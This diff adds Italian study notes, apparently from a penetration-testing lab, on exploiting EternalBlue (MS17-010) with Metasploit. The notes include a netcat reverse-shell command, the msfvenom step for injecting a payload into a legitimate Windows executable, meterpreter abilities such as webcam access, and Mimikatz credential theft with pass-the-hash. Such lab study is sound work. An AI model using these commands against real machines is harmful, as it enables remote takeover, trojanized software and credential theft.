@@ -1,0 +1,31 @@
+vedremo la vunlerabilità "Eternal Blue" dovuta a SMBA di windows: sulla macchina Windows usiamo la modalità NAT così da creare IP al di fuori degli IP del PC e useremo MetaSploit.
+Uso ovviamente anche Kali mettendolo in ascolto sulla porta 8888 (nc -lvp 8888), e poi sul pc hosto uso netcat facendo (nc -e /bin/ Indirizzo_Ip 8888), e facendo così praticamente
+mando la shell su quell'IP sulla porta 8888 così da controllare quella cartella del pc: praticamente sto controllando la caretlla della shell di un pc dalla macchina virtuale kali
+Così poi kali ha gli stessi permessi che usavo nella shell del pc, e ciò mi permette di cerare malware inserendo magari quel comando in un file malevolo: questo "attacco" si chiama
+REVERSE SHELL, che in realtà è tutto valido, e ci sono diversi modi per farlo.
+Una volta usata la reverse shell, io potrei voler copiare i file ma potrei perdere tempo, quindi lo vorrei fare in automatico con dei tool. (posso registrare lo schermo con asciinema rec)
+La prima cosa da fare è (sudo mfdb start) per avviare il database, e poi (msfconsole) per avviare MetaSploit. Devo poi fare scanning ed enumeration usando (db_nmap Inidirizzi_Ip)
+che un wrapper di nmap: praticamente fa nmpa e salva i risultati sul database avviato prima, e poi con (host) vedo le info relativi a quelli Ip salvati nel db.
+Con (db_nmap Indirizzo_Ip -Pn -A) posso fare scanning aggressivo sulle porte scoperte dell'host (-A) così da vedere anche le varie vulnerabilità dei servizi attivi su quelle porte, e 
+dico anche di fare lo scanning lo stesso anche se l'host non mi risponde (-Pn). La porta che ci interessa è la 445, dove si trova la cartella condivisa (quella vunerabile al null 
+session attack), che potrebbe non essere condivisa e nel caso la devo condividere io disabilitando il firewall di windows.
+Con lo script (smb-vuln-ms17-010) vedo se la porta smba è vulnerabile: se trovo per esempio RCE significa che quella porta è vulnerabile all'esecuzione di codice remoto, e poi
+con (search eternalblue) vedo se è vulnerabile è Eternal Blue. Posso quindi sfruttare quella vulnerabilità con (use exploit\smb\ms17_010_eternalblue), e per sfruttarla poi
+devo definire un payload di attacco, facendolo con (set RHOSTS Indirizzo_Ip) (lo vedo con show option se c'è).
+Faccio poi (set LHOST Indirizzo_Ip) per mandargli una reverse shell, e poi sono protno per attaccare. Il payload di attacco lo posso creare con (msfvenom -a Architettura --platform
+Piattaforma -x Software_modificato_che_mi_da_il_controllo -p Caretlla_in_cui_si_trova_eseguibile_da_attaccare lhost Indirizzo_Ip -f exe -o Eseguibile_da_attaccare): inietta il malware
+in quell'exe che sta in quella cartella di quella piattaforma (tipo windows) con quella architettura (tipo x64 per 64 bit).
+Così quando poi il pc avvia quell'eseguibile (nell'esempio la calcolatrice), do l'accesso al pc alla macchina virtuale kali.
+Questo Software_modificato_che_mi_da_il_controllo lo ottengo prendendo l'eseguibile da attaccare nella macchina windows, lo analizzo con (file Eseguibile_da_attacare) e poi sempre cn 
+msfvenom lo creo.
+Una volta avuto l'accesso a windows, con (meterpreter) posso fare delle cose come avviare la webcam, avere informazione sul sistema ecc..
+Ipayload di meterpeter sono di diversi, ma principalmente di 2 tipi:
+-bind: apre una porta verso l'host attaccato, così mi ci connetto
+-reverse: è l'host attaccato che si connette a me
+I più semplici da usare sono i tcp, con l'estensione rc4 per cofrare, o http per usare anche un certificato oltre alla cifratura.
+
+hashcat è un programma che usa la scheda video per fare calcoli complessi.
+
+kiwi/Mimikatz può estrarre dalla memoria password in chiaro, funzioni crittografiche hash, codice PIN e ticket Kerberos. Può anche eseguire pass-the-hash, pass-the-ticket, creare 
+biglietti vincenti, lavorare su certificati o chiavi private e protette. Tali credenziali ottenute possono essere in seguito utilizzate per eseguire movimenti laterali e accedere 
+a informazioni riservate. La maggior parte del software AntiVirus rileva i binari Mimikatz predefiniti.
